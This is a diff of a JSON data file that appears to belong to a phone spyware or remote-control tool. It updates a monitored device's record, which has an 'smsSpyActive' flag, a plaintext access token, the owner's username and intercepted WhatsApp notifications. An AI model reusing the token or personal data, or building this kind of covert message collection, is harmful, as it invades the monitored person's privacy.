@@ -108,7 +108,7 @@
     "deviceName": "HP-RASKA321-52A8",
     "ownerUsername": "Amsal.sim",
     "token": "906fc9b5e5fd7ed9167409d9979fb58b",
-    "lastSeen": 1776028244368,
+    "lastSeen": 1776028253378,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-11T16:02:07.690Z",
@@ -130,6 +130,14 @@
     },
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Memeriksa pesan baru",
+        "time": "13/04 04:10",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776028255877
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -4121,14 +4129,6 @@
         "time": "12/04 21:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1776002458293
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "𓆚꧁𝐿𝐸𝑍𝐴 𝐿𝑃𝑀꧂𓆚",
-        "content": "‎2 pesan baru",
-        "time": "12/04 21:00",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776002455860
       }
     ],
     "galleryPhotos": [],
